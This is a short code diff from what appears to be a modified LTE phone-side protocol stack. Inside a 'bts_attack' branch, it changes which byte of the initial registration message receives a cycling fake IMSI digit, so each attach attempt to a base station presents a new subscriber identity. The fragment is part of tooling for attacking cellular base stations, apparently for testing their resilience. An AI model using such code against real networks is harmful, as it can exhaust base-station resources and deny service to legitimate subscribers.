@@ -1314,7 +1314,7 @@ static void rrc_ue_generate_RRCSetupComplete(
     if (bts_attack >= 5) {
       LOG_E(RRC, "[BTS_ATTACK_ITEM_01]: Create a unique IMSI for each RRC attach attempt\n");
       // Create a unique (monotonically increasing) IMSI for each attach (n.b., BCD encoding, below)
-      initialNasMsg.data[11] = (_btsIMSIByte % 10) | ((_btsIMSIByte / 10) << 4);
+      initialNasMsg.data[17] = (_btsIMSIByte % 10) | ((_btsIMSIByte / 10) << 4);
       if (++_btsIMSIByte == 100)
 	      _btsIMSIByte = 0;
     }
